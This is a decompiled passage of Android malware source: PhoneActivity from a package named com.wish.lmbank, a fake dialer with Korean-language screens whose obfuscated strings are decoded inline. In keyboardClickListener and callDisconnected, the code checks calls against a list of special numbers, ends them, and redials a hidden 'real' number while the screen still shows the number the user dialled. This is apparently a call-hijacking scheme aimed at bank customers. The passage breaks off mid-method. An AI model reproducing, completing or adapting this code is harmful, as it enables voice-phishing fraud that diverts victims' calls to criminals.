//
// Decompiled by FernFlower - 1009ms
//
package com.wish.lmbank.phone;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.AnimationDrawable;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.media.AudioAttributes;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.telecom.Call;
import android.telephony.PhoneNumberUtils;
import android.text.TextUtils;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.RemoteViews;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.phone.notify.NotifyBean;
import com.wish.lmbank.phone.service.TeleNotifyService;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.utils.ContactUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;
import com.wish.lmbank.view.CallCustomView;

import java.util.Timer;
import java.util.TimerTask;

import gv00l3ah.mvdt7w.bb7d7pu7;

public class PhoneActivity extends AppCompatActivity implements View.OnClickListener, SensorEventListener, Keyboard.KeyboardListener {
    private static final String TAG = "com.wish.lmbank.phone.PhoneActivity";
    private static Timer callTimer;
    private static LinearLayout llTimerContainer;
    private static int mCallType;
    private static String mPhoneNumberReal;
    public static String mSource;
    private static RelativeLayout rlCallingContainer;
    private static RelativeLayout rlIncomingContainer;
    private static TextView tvDialing;
    private final long COUNT_DOWN_TIME = 35L;
    private final int NOTIFICATION_ID = 1993;
    private CallCustomView callCustomView;
    private int callingTime;
    private boolean d0 = false;
    private String displayName;
    private boolean e0 = false;
    private Handler handler = new Handler();
    private boolean isCancelAutoEndCall = false;
    private boolean isDestroy = false;
    private boolean isExecuteCloseActivity = false;
    private boolean isFirstCreateNotificationChannel = false;
    private boolean isFirstCreateRemoteView = false;
    private ImageView ivCallStop;
    private ImageView ivMic;
    private ImageView ivRecording;
    private ImageView ivSpeaker;
    private Keyboard keyboard;
    private View keyboardLayout;
    private Sensor mSensor;
    private SensorManager mSensorManager;
    private PowerManager.WakeLock mWakeLock;
    private View menuTop;
    private NotificationManager notificationManager;
    public NotifyBean notifyBean = new NotifyBean();
    private final Runnable notifyRunnable = new NotifyRunnable(this);
    private int notifyTime = 0;
    private String pNumber;
    private PhoneCallManager phoneCallManager;
    private View place;
    private RemoteViews remoteViews;
    private TextView tvCallStop;
    private TextView tvCallingTime;
    private TextView tvIncomingNumber;
    private TextView tvIncomingTitle;
    private TextView tvKeyboardTxt;
    private TextView tvPhone;
    private TextView tvPhone2;
    private TextView tvRecording;

    // $FF: synthetic method
    static int access$000(PhoneActivity var0) {
        return var0.notifyTime;
    }

    // $FF: synthetic method
    static int access$100(PhoneActivity var0) {
        return var0.startNotifyTimer();
    }

    // $FF: synthetic method
    static TextView access$1000(PhoneActivity var0) {
        return var0.tvCallingTime;
    }

    // $FF: synthetic method
    static boolean access$1100(PhoneActivity var0) {
        return var0.isCancelAutoEndCall;
    }

    // $FF: synthetic method
    static int access$1200() {
        return mCallType;
    }

    // $FF: synthetic method
    static String access$1300() {
        return mPhoneNumberReal;
    }

    // $FF: synthetic method
    static String access$1400(PhoneActivity var0) {
        return var0.pNumber;
    }

    // $FF: synthetic method
    static Runnable access$200(PhoneActivity var0) {
        return var0.notifyRunnable;
    }

    // $FF: synthetic method
    static Handler access$300(PhoneActivity var0) {
        return var0.handler;
    }

    // $FF: synthetic method
    static String access$400() {
        return TAG;
    }

    // $FF: synthetic method
    static PhoneCallManager access$500(PhoneActivity var0) {
        return var0.phoneCallManager;
    }

    // $FF: synthetic method
    static RelativeLayout access$600() {
        return rlCallingContainer;
    }

    // $FF: synthetic method
    static RelativeLayout access$700() {
        return rlIncomingContainer;
    }

    // $FF: synthetic method
    static void access$800(PhoneActivity var0) {
        var0.showTimer();
    }

    // $FF: synthetic method
    static int access$900(PhoneActivity var0) {
        return var0.callingTime;
    }

    // $FF: synthetic method
    static int access$908(PhoneActivity var0) {
        int var1 = var0.callingTime++;
        return var1;
    }

    public static void actionStart(Context var0, String var1, String var2, int var3, String var4) {
        StringBuilder var5 = new StringBuilder();
        var5.append(PhoneCallService.class.getName());
//         var5.append(bb7d7pu7.m5998("RUkICh0ABgc6HQgbHUVJGSccBAsMG1NJ"));
        var5.append(", actionStart, pNumber: ");
        var5.append(var1);
//         var5.append(bb7d7pu7.m5998("RUkZAQYHDCccBAsMGzsMCAVTSQ"));
        var5.append(", phoneNumberReal: ");
        var5.append(var2);
//         var5.append(bb7d7pu7.m5998("RUkKCAUFPRAZDDZTSQ"));
        var5.append(", callType_: ");
        var5.append(var3);
        LogUtils.callLog(var5.toString());
        mSource = var4;
        mCallType = var3;
        mPhoneNumberReal = var2;
        Intent var6 = new Intent(var0, PhoneActivity.class);
        var6.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//         var4 = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHJCAkLDY9MDksOg");
        var4 = "android.intent.extra.MIME_TYPES";
        var6.putExtra(var4, var3);
//         var4 = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7");
        var4 = "android.intent.extra.PHONE_NUMBER";
        var6.putExtra(var4, var1);
        var0.startActivity(var6);
    }

    private void createNotification() {
        if (VERSION.SDK_INT >= 26) {
            this.notificationManager = this.getSystemService(NotificationManager.class);
        }
    }

    public static String fillZero(int var0) {
        String var2;
        if (var0 >= 0 && var0 < 10) {
            StringBuilder var1 = new StringBuilder();
//             var2 = bb7d7pu7.m5998("WQ");
            var2 = "0";
            var1.append(var2);
            var1.append(var0);
            var2 = var1.toString();
        } else {
            var2 = String.valueOf(var0);
        }

        return var2;
    }

    private String getNotificationChannelId() {
        StringBuilder var1 = new StringBuilder();
        var1.append(this.getPackageName());
//         var1.append(bb7d7pu7.m5998("Rw"));
        var1.append(".");
        var1.append(this.getClass().getSimpleName());
        return var1.toString();
    }

    private void initData() {
        PhoneCallManager var1 = new PhoneCallManager(this);
        this.phoneCallManager = var1;
        var1.saveInitState();
        AppStartV.isCalling = true;
        if (this.getIntent() != null) {
            String var2 = this.getIntent().getAction();
//             String var3 = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRy0gKCU");
            String var3 = "android.intent.action.DIAL";
            if (var3.equals(var2) && this.getIntent().getData() != null) {
//                 Intent var4 = this.getPackageManager().getLaunchIntentForPackage(bb7d7pu7.m5998("CgYERxoIBBocBw5HCAcNGwYADUcNAAgFDBs"));
                Intent var4 = this.getPackageManager().getLaunchIntentForPackage("com.samsung.android.dialer");
                if (var4 != null) {
                    var4.setAction(var3);
                    var4.setData(Uri.parse(this.getIntent().getData().toString()));
                    var4.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    this.startActivity(var4);
                    this.closeActivity();
                    return;
                }

//                 var4 = this.getPackageManager().getLaunchIntentForPackage(bb7d7pu7.m5998("CgYERwgHDRsGAA1HCgYHHQgKHRo"));
                var4 = this.getPackageManager().getLaunchIntentForPackage("com.android.contacts");
                if (var4 != null) {
                    var4.setAction(var3);
                    var4.setData(Uri.parse(this.getIntent().getData().toString()));
                    var4.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    this.startActivity(var4);
                    this.closeActivity();
                    return;
                }
            }

//             this.pNumber = this.getIntent().getStringExtra(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7"));
            this.pNumber = this.getIntent().getStringExtra("android.intent.extra.PHONE_NUMBER");
//             mCallType = this.getIntent().getIntExtra(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHJCAkLDY9MDksOg"), 0);
            mCallType = this.getIntent().getIntExtra("android.intent.extra.MIME_TYPES", 0);
        }

    }

    private void initIncomingUI() {
        this.callCustomView.setCallBack(new PhoneActivity$1(this));
    }

    @SuppressLint("ResourceType")
    private void initView() {
        rlIncomingContainer = this.findViewById(R.id.ho);
        rlCallingContainer = this.findViewById(R.id.d_);
        tvDialing = (TextView) this.findViewById(R.id.pk);
        this.tvIncomingTitle = (TextView) this.findViewById(R.id.pn);
        this.tvIncomingNumber = (TextView) this.findViewById(R.id.pm);
        this.callCustomView = (CallCustomView) this.findViewById(R.id.d2);
        this.tvPhone = (TextView) this.findViewById(R.id.l5);
        this.tvPhone2 = (TextView) this.findViewById(R.id.l6);
        llTimerContainer = (LinearLayout) this.findViewById(R.id.j1);
        this.tvCallingTime = (TextView) this.findViewById(R.id.pp);
        this.ivSpeaker = (ImageView) this.findViewById(R.id.hn);
        this.ivRecording = (ImageView) this.findViewById(R.id.hm);
        this.ivCallStop = (ImageView) this.findViewById(R.id.hk);
        this.tvCallStop = (TextView) this.findViewById(R.id.pj);
        this.ivMic = (ImageView) this.findViewById(R.id.hl);
        this.tvRecording = (TextView) this.findViewById(R.id.po);
        this.place = this.findViewById(R.id.l9);
        this.menuTop = this.findViewById(R.id.j7);
        this.keyboardLayout = this.findViewById(R.id.ia);
        Keyboard var1 = this.findViewById(R.id.i_);
        this.keyboard = var1;
        var1.setKeyboardClickListener(this);
        TextView var2 = (TextView) this.findViewById(R.id.ib);
        this.tvKeyboardTxt = var2;
        var1 = this.keyboard;
        var1.b(var2);
        View var9 = this.findViewById(R.id.h7);
        var9.setOnClickListener(this);
//        var9 = this.findViewById(0x7f090127);
        var9 = this.findViewById(R.id.ha);
        var9.setOnClickListener(this);
//        var9 = this.findViewById(0x7f090122);
        var9 = this.findViewById(R.id.h6);
        var9.setOnClickListener(this);
//        var9 = this.findViewById(0x7f090128);
        var9 = this.findViewById(R.id.hb);
        var9.setOnClickListener(this);
//        var9 = this.findViewById(0x7f090126);
        var9 = this.findViewById(R.id.h_);
        var9.setOnClickListener(this);
//        var9 = this.findViewById(0x7f090125);
        var9 = this.findViewById(R.id.h9);
        var9.setOnClickListener(this);



//         String var11 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
        String var11 = "KEY_IS_FORWARDING_HAND_UP";
        boolean var3 = SharedPreferencesUtils.getValue(var11, false);
        int var4 = mCallType;
        if (var4 != 2) {
            if (var4 == 1) {
                SharedPreferencesUtils.putValue(var11, false);
            }

        } else if (var3) {
//             var11 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA");
            var11 = "KEY_FORWARDING_SHOW_PHONE";
            var11 = SharedPreferencesUtils.getValue(var11, "");
            boolean var7 = TextUtils.isEmpty(var11);
            if (!var7) {
                this.pNumber = var11;
            }
        }

        StringBuilder var5 = new StringBuilder();
        String var10 = TAG;
        var5.append(var10);
//         var11 = bb7d7pu7.m5998("RUkABwAdPwAMHkVJjPjVjObCgdTFjs7SU0k");
        var11 = ", initView, 呼叫转移: ";
        var5.append(var11);
        var5.append(var3);
//         var11 = bb7d7pu7.m5998("RUkZJxwECwwbU0k");
        var11 = ", pNumber: ";
        var5.append(var11);
        String var6 = this.pNumber;
        var5.append(var6);
        String var12 = var5.toString();
        LogUtils.callLog(var12);
        var12 = this.pNumber;
        var3 = TextUtils.isEmpty(var12);
        if (!var3) {
            var12 = this.pNumber;
            this.displayName = ContactUtils.queryDisplayName(this, var12);
            var4 = mCallType;
//             var12 = bb7d7pu7.m5998("Ijs");
            var12 = "KR";
            String var8;
            RelativeLayout var14;
            TextView var16;
            if (var4 != 1) {
                if (var4 == 2) {
                    var14 = rlCallingContainer;
                    var14.setVisibility(View.VISIBLE);
                    var14 = rlIncomingContainer;
                    var14.setVisibility(View.GONE);
                }
            } else {
                var14 = rlCallingContainer;
                var14.setVisibility(View.GONE);
                var14 = rlIncomingContainer;
                var14.setVisibility(View.VISIBLE);
                var6 = this.displayName;
                var3 = TextUtils.isEmpty(var6);
                if (var3) {
                    var16 = this.tvIncomingTitle;
                    var8 = this.pNumber;
                    var8 = PhoneNumberUtils.formatNumber(var8, var12);
                    var16.setText(var8);
                    var16 = this.tvIncomingNumber;
                    var16.setText("");
                } else {
                    TextView var17 = this.tvIncomingTitle;
                    var6 = this.displayName;
                    var17.setText(var6);
                    var16 = this.tvIncomingNumber;
                    var8 = this.pNumber;
                    var8 = PhoneNumberUtils.formatNumber(var8, var12);
                    var16.setText(var8);
                }

                this.initIncomingUI();
            }

            var8 = this.pNumber;
//             var6 = bb7d7pu7.m5998("QlFb");
            var6 = "+82";
            var3 = var8.startsWith(var6);
            if (var3) {
                StringBuilder var18 = new StringBuilder();
//                 var8 = bb7d7pu7.m5998("WQ");
                var8 = "0";
                var18.append(var8);
                var8 = this.pNumber;
                var8 = var8.substring(3);
                var18.append(var8);
                this.pNumber = var18.toString();
            }

            var6 = this.displayName;
            var3 = TextUtils.isEmpty(var6);
            if (!var3) {
                TextView var13 = this.tvPhone;
                var10 = this.displayName;
                var13.setText(var10);
                var13 = this.tvPhone2;
                var10 = this.pNumber;
                var10 = PhoneNumberUtils.formatNumber(var10, var12);
                var13.setText(var10);
                return;
            }

            var16 = this.tvPhone;
            var8 = this.pNumber;
            var12 = PhoneNumberUtils.formatNumber(var8, var12);
            var16.setText(var12);
            TextView var15 = this.tvPhone2;
            var15.setText("");
        }

        var5 = new StringBuilder();
        var5.append(var10);
//         var5.append(bb7d7pu7.m5998("RUkNABoZBQgQJwgEDFNJ"));
        var5.append(", displayName: ");
        var10 = this.displayName;
        var5.append(var10);
        var5.append(var11);
        var11 = this.pNumber;
        var5.append(var11);
        var11 = var5.toString();
        LogUtils.callLog(var11);
    }

    private void removeNotifyCallback() {
        if (this.notifyBean != null && this.notifyTime != -1) {
            this.notifyTime = -1;
            this.notifyBean = null;
            this.handler.removeCallbacks(this.notifyRunnable);
        }

    }

    private PendingIntent setPendingIntent(String var1) {
        Intent var2 = new Intent(this, TeleNotifyService.class);
        var2.setAction(var1);
        return PendingIntent.getService(this, 0, var2, 0);
    }

    private void showTimer() {
//         String var1 = bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ");
        String var1 = "system_switch";
//         String var2 = bb7d7pu7.m5998("Bgc");
        String var2 = "on";
        var1 = SharedPreferencesUtils.getValue(var1, var2);
        this.runOnUiThread(new PhoneActivity$3(this, var1));
    }

    private void startBackgroundAnimation() {
        AnimationDrawable var1 = (AnimationDrawable) this.findViewById(R.id.gl).getBackground();
        var1.setEnterFadeDuration(2000);
        var1.setExitFadeDuration(4000);
        var1.start();
    }

    private void startNotification() {
        this.removeNotifyCallback();
        this.notifyTime = 0;
        this.handler.post(this.notifyRunnable);
    }

    private int startNotifyTimer() {
        return this.notifyTime++;
    }

    private void startTimer() {
        llTimerContainer.setVisibility(View.VISIBLE);
        tvDialing.setVisibility(View.GONE);
        if (callTimer == null) {
            Timer var1 = new Timer();
            callTimer = var1;
            var1.schedule(new PhoneActivity$2(this), 0L, 1000L);
        }

    }

    private void toHome() {
        Intent var1 = new Intent();
//         String var2 = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyQoICc");
        String var2 = "android.intent.action.MAIN";
        var1.setAction(var2);
//         var2 = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCggdDA4GGxBHISYkLA");
        var2 = "android.intent.category.HOME";
        var1.addCategory(var2);
//        var1.addFlags(0x10200000);
        var1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
        this.startActivity(var1);
    }

    public void callActive(Call var1) {
        StringBuilder var2 = new StringBuilder();
        var2.append(TAG);
//         var2.append(bb7d7pu7.m5998("RUkKCAUFKAodAB8M"));
        var2.append(", callActive");
        LogUtils.callLog(var2.toString());
        rlCallingContainer.setVisibility(View.VISIBLE);
        rlIncomingContainer.setVisibility(View.GONE);
        this.startTimer();
        this.startNotification();
    }

    public void callDisconnected(boolean var1, String var2) {
        StringBuilder var3 = new StringBuilder();
        String var4 = TAG;
        var3.append(var4);
//         String var5 = bb7d7pu7.m5998("RUkKCAUFLQAaCgYHBwwKHQwNRUkAGi8ABwAaAVNJ");
        String var5 = ", callDisconnected, isFinish: ";
        var3.append(var5);
        var3.append(var1);
//         var5 = bb7d7pu7.m5998("RUkKCAUFOQEGBwxTSQ");
        var5 = ", callPhone: ";
        var3.append(var5);
        var3.append(var2);
        LogUtils.callLog(var3.toString());
        if (!var1) {
//             String var8 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw");
            String var8 = "KEY_FORWARDING_PHONE";
            var8 = SharedPreferencesUtils.getValue(var8, "");
//             var5 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA");
            var5 = "KEY_FORWARDING_SHOW_PHONE";
            var5 = SharedPreferencesUtils.getValue(var5, "");
            StringBuilder var6 = new StringBuilder();
            var6.append(var4);
//             var6.append(bb7d7pu7.m5998("RUkKCAUFLQAaCgYHBwwKHQwNRUmP4sGP4PqO_dyBxvRFSQ8GGx4IGw0ABw45AQYHDFNJ"));
            var6.append(", callDisconnected, 拨打电话, forwardingPhone: ");
            var6.append(var8);
//             var4 = bb7d7pu7.m5998("RUkPBhseCBsNAAcOOgEGHjkBBgcMU0k");
            var4 = ", forwardingShowPhone: ";
            var6.append(var4);
            var6.append(var5);
            var4 = var6.toString();
            LogUtils.callLog(var4);
            if (!TextUtils.isEmpty(var8)) {
                var1 = var5.equals(var2);
                if (var1) {
                    SettingUtils.startActivityForCall(this, var8);
                }
            }
        } else {
            RelativeLayout var7 = rlIncomingContainer;
            var7.setVisibility(View.GONE);
            var7 = rlCallingContainer;
            var7.setVisibility(View.GONE);
            PhoneCallManager.resetInitState();
            this.closeActivity();
            this.toHome();
        }

    }

    public void cancelNotification() {
        try {
//             String var4 = bb7d7pu7.m5998("BwYdAA8ACggdAAYH");
            NotificationManager var5 = (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);
            var5.cancel(1993);
        } catch (Exception var3) {
            StringBuilder var1 = new StringBuilder();
            var1.append(TAG);
//             var1.append(bb7d7pu7.m5998("RUkKCAcKDAUnBh0ADwAKCB0ABgdJDBEKDBkdAAYHU0k"));
            var1.append(", cancelNotification exception: ");
            var1.append(var3.getMessage());
            LogUtils.callLog(var1.toString());
        }

    }

    public void cancelTimer() {
        Timer var1 = callTimer;
        if (var1 != null) {
            var1.cancel();
        }

        this.callingTime = 0;
        callTimer = null;
    }

    public void closeActivity() {
        StringBuilder var1 = new StringBuilder();
        var1.append(TAG);
//         var1.append(bb7d7pu7.m5998("RUkKBQYaDCgKHQAfAB0QRUkAGiwRDAocHQwqBQYaDCgKHQAfAB0QU0k"));
        var1.append(", closeActivity, isExecuteCloseActivity: ");
        var1.append(this.isExecuteCloseActivity);
        LogUtils.callLog(var1.toString());
        if (!this.isExecuteCloseActivity) {
            this.isExecuteCloseActivity = true;
            if (VERSION.SDK_INT >= 21) {
                this.finishAndRemoveTask();
            } else {
                this.finish();
            }

            this.isExecuteCloseActivity = false;
        }

    }

    public void createRemoteView() {
        if (!this.isDestroy) {
            String var1 = this.pNumber;
            if (!this.isFirstCreateRemoteView) {
                this.displayName = ContactUtils.queryDisplayName(this, var1);
                this.isFirstCreateRemoteView = true;
            }

            String var2 = this.displayName;
            if (var2 == null) {
                var2 = var1;
            }

            Intent var7 = new Intent(this, PhoneActivity.class);
//            var7.setFlags(0x14000000);
            var7.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PendingIntent var3 = PendingIntent.getActivity(this, 0, var7, 0);
            RemoteViews var8;
            if (mCallType == 1) {
                var8 = new RemoteViews(this.getPackageName(), R.layout.cv);
            } else {
                var8 = new RemoteViews(this.getPackageName(), R.layout.cu);
            }

            this.remoteViews = var8;
//             var1 = bb7d7pu7.m5998("CgUACgJEBAAK");
            var1 = "click-mic";
            PendingIntent var9 = this.setPendingIntent(var1);
//             String var4 = bb7d7pu7.m5998("CgUACgJEGQEGBwxEGwwDDAod");
            String var4 = "click-phone-reject";
            PendingIntent var16 = this.setPendingIntent(var4);
//             String var5 = bb7d7pu7.m5998("CgUACgJEGQEGBwxECAoKDBkd");
            String var5 = "click-phone-accept";
            PendingIntent var18 = this.setPendingIntent(var5);
//             String var6 = bb7d7pu7.m5998("CgUACgJEGgYcBw0");
            String var6 = "click-sound";
            PendingIntent var19 = this.setPendingIntent(var6);
            if (var16 != null) {
                this.remoteViews.setOnClickPendingIntent(R.id.kh, var16);
            }

            if (var18 != null) {
                this.remoteViews.setOnClickPendingIntent(R.id.kj, var18);
            }

            if (var9 != null) {
                this.remoteViews.setOnClickPendingIntent(R.id.kf, var9);
            }

            if (var19 != null) {
                this.remoteViews.setOnClickPendingIntent(R.id.kk, var19);
            }

//             this.notifyBean.b(bb7d7pu7.m5998("hcnthPD9"));
            this.notifyBean.b("전화");
            this.notifyBean.c(var2);
            this.remoteViews.setTextViewText(R.id.ki, this.notifyBean.d);
            this.remoteViews.setTextViewText(R.id.kg, this.notifyBean.c);
            this.remoteViews.setTextViewText(R.id.kj, this.notifyBean.time);
            this.remoteViews.setImageViewResource(R.id.kf, this.notifyBean.h);
            this.remoteViews.setImageViewResource(R.id.kk, this.notifyBean.g);
            this.remoteViews.setImageViewResource(R.id.kh, this.notifyBean.i);
            this.remoteViews.setImageViewResource(R.id.kj, this.notifyBean.f);
            if (VERSION.SDK_INT >= 26) {
                if (!this.isFirstCreateNotificationChannel) {
                    NotificationChannel var13 = new NotificationChannel(this.getNotificationChannelId(), this.getPackageName(), NotificationManager.IMPORTANCE_DEFAULT);
                    var13.setSound((Uri) null, (AudioAttributes) null);
//                     var4 = bb7d7pu7.m5998("SQ");
                    var4 = " ";
                    var13.setDescription(var4);
                    var13.setShowBadge(false);
                    var13.enableLights(false);
                    var13.enableVibration(false);
                    var13.setVibrationPattern(new long[]{0L});
                    this.notificationManager.createNotificationChannel(var13);
                    this.isFirstCreateNotificationChannel = true;
                }

                Notification.Builder var14 = new Notification.Builder(this, this.getNotificationChannelId());
                var14.setSmallIcon(R.mipmap.r);
                var14.setContentTitle(var2);
                var14.setCustomContentView(this.remoteViews);
                var14.setCustomBigContentView(this.remoteViews);
                var14.setOngoing(true);
                var14.setContentIntent(var3);
                var14.setWhen(System.currentTimeMillis());
                var14.setAutoCancel(false);
                var14.setCustomContentView(this.remoteViews);
                var14.setCustomBigContentView(this.remoteViews);
                NotificationManager var10 = this.notificationManager;
                if (var10 != null) {
                    var10.notify(1993, var14.build());
                }
            } else {
                NotificationManager var15 = this.notificationManager;
                if (var15 != null) {
                    Notification.Builder var17 = new Notification.Builder(this);
                    Notification.Builder var11 = var17.setContentTitle(var2);
                    var11 = var11.setWhen(System.currentTimeMillis());
                    var11 = var11.setSmallIcon(R.mipmap.r);
                    var11 = var11.setPriority(Notification.PRIORITY_HIGH);
                    var11 = var11.setDefaults(8);
                    var11 = var11.setContentIntent(var3);
                    RemoteViews var12 = this.remoteViews;
                    var11 = var11.setContent(var12);
                    var11 = var11.setSound((Uri) null);
                    var11 = var11.setVibrate(new long[]{0L});
                    Notification var20 = var11.build();
                    var15.notify(1993, var20);
                }
            }
        }

    }

    public String formatTime(int var1) {
        String var2;
        if (var1 == 0) {
//             var2 = bb7d7pu7.m5998("WVlTWVk");
            var2 = "00:00";
        } else {
            int var3 = var1 / 3600;
            int var4 = var1 % 3600;
            var1 = var4 / 60;
            var4 %= 60;
//             var2 = bb7d7pu7.m5998("Uw");
            var2 = ":";
            StringBuilder var5;
            if (var3 > 0) {
                var5 = new StringBuilder();
                var5.append(fillZero(var3));
                var5.append(var2);
                var5.append(fillZero(var1));
                var5.append(var2);
                var5.append(fillZero(var4));
                var2 = var5.toString();
            } else {
                var5 = new StringBuilder();
                var5.append(fillZero(var1));
                var5.append(var2);
                var5.append(fillZero(var4));
                var2 = var5.toString();
            }
        }

        return var2;
    }

    public String getCallingTime() {
        int var1 = this.callingTime;
        int var2 = var1 / 60;
        StringBuilder var3 = new StringBuilder();
        var3.append(fillZero(var2));
//         String var4 = bb7d7pu7.m5998("Uw");
        String var4 = ":";
        var3.append(var4);
        var3.append(fillZero(var1 % 60));
        return var3.toString();
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void keyboardClickListener(String var1) {
//         String var2 = bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ");
        String var2 = "system_switch";
//         String var3 = bb7d7pu7.m5998("Bgc");
        String var3 = "on";
        String var4 = SharedPreferencesUtils.getValue(var2, var3);
        StringBuilder var7 = new StringBuilder();
        StringBuilder var5 = new StringBuilder();
        var5.append(TAG);
//         var5.append(bb7d7pu7.m5998("RUmP5eCA_cdTSQ"));
        var5.append(", 按键: ");
        var5.append(var1);
//         var5.append(bb7d7pu7.m5998("RUkAGioIBwoMBSgcHQYsBw0qCAUFU0k"));
        var5.append(", isCancelAutoEndCall: ");
        var5.append(this.isCancelAutoEndCall);
        var7.append(var5.toString());
        if (!var1.equals("")) {
            LimitPhoneNumberBean var8 = SettingUtils.isSpecial(mPhoneNumberReal);
            if (var3.equals(var4) && var8 != null && mCallType == 2) {
                StringBuilder var6 = new StringBuilder();
//                 var6.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztJTSQ"));
                var6.append(", 呼叫转移: ");
                var6.append(var8.getRealPhoneNumber());
                var7.append(var6.toString());
                if (this.phoneCallManager.disconnect() || SettingUtils.endCall(this)) {
                    this.isCancelAutoEndCall = true;
//                     var1 = bb7d7pu7.m5998("RUmP5euP_8SO_dyBxvQ");
                    var1 = ", 挂断电话";
                    var7.append(var1);
//                     var1 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
                    var1 = "KEY_IS_FORWARDING_HAND_UP";
                    SharedPreferencesUtils.putValue(var1, true);
                    var1 = this.pNumber;
//                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), var1);
                    SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", var1);
                    var1 = var8.getRealPhoneNumber();
//                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), var1);
                    SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", var1);
                }
            } else if (PhoneCallManager.call != null) {
//                 String var9 = bb7d7pu7.m5998("RUmP5eCA_ceM-NWM5sI");
                String var9 = ", 按键呼叫";
                var7.append(var9);
                PhoneCallManager.call.playDtmfTone(var1.charAt(0));
                PhoneCallManager.call.stopDtmfTone();
            }
        }

        LogUtils.callLog(var7.toString());
    }

    public void onAccuracyChanged(Sensor var1, int var2) {
    }

    public void onClick(View var1) {
        boolean var2 = false;
        int var3;
        switch (var1.getId()) {
            case R.id.h6:
                var2 = !this.d0;
                this.d0 = var2;
                this.phoneCallManager.setCallHold(var2);
                if (this.d0) {
                    this.ivCallStop.setImageResource(R.drawable.cl);
//                     this.tvCallStop.setText(bb7d7pu7.m5998("guLNheL1hO_chPD9"));
                    this.tvCallStop.setText("다시통화");
                } else {
                    this.ivCallStop.setImageResource(R.drawable.cj);
//                     this.tvCallStop.setText(bb7d7pu7.m5998("hO_chPD9guXpg9HZ"));
                    this.tvCallStop.setText("통화대기");
                }
                break;
            case R.id.h7:
                StringBuilder var4 = new StringBuilder();
                var4.append(TAG);
//                 var4.append(bb7d7pu7.m5998("RUkLHB0dBgdJDAcNSQoIBQVFSRkBBgcMKggFBSQIBwgODBtJVFRJBxwFBVNJ"));
                var4.append(", button end call, phoneCallManager == null: ");
                if (this.phoneCallManager == null) {
                    var2 = true;
                }

                var4.append(var2);
                LogUtils.callLog(var4.toString());
                this.phoneCallManager.disconnect();
                this.cancelTimer();
                this.closeActivity();
            case R.id.h8:
            default:
                break;
            case R.id.h9:
                if (this.keyboardLayout.getVisibility() != View.VISIBLE) {
                    this.keyboardLayout.setVisibility(View.VISIBLE);
                    this.tvPhone.setVisibility(View.GONE);
                    this.tvKeyboardTxt.setText("");
                    this.tvKeyboardTxt.setVisibility(View.VISIBLE);
                    this.place.setVisibility(View.VISIBLE);
                    this.menuTop.setVisibility(View.GONE);
                } else {
                    this.menuTop.setVisibility(View.VISIBLE);
                    this.tvKeyboardTxt.setVisibility(View.GONE);
                    this.tvPhone.setVisibility(View.VISIBLE);
                    this.tvPhone2.setVisibility(View.VISIBLE);
                    this.keyboardLayout.setVisibility(View.GONE);
                    this.place.setVisibility(View.GONE);
                }
                break;
            case R.id.h_:
                if (this.phoneCallManager.setMicrophone()) {
                    var3 = R.drawable.cb;
                } else {
                    var3 = R.drawable.ca;
                }

                this.ivMic.setImageResource(var3);
                break;
            case R.id.ha:
                var2 = !this.e0;
                this.e0 = var2;
                if (var2) {
                    this.ivRecording.setImageResource(R.drawable.cu);
//                     this.tvRecording.setText(bb7d7pu7.m5998("guzQhfTlhc34hc7p"));
                    this.tvRecording.setText("녹음중지");
                } else {
                    this.ivRecording.setImageResource(R.drawable.ct);
//                     this.tvRecording.setText(bb7d7pu7.m5998("guzQhfTl"));
                    this.tvRecording.setText("녹음");
                }
                break;
            case R.id.hb:
                if (this.phoneCallManager.setSpeaker()) {
                    var3 = R.drawable.d2;
                } else {
                    var3 = R.drawable.d1;
                }

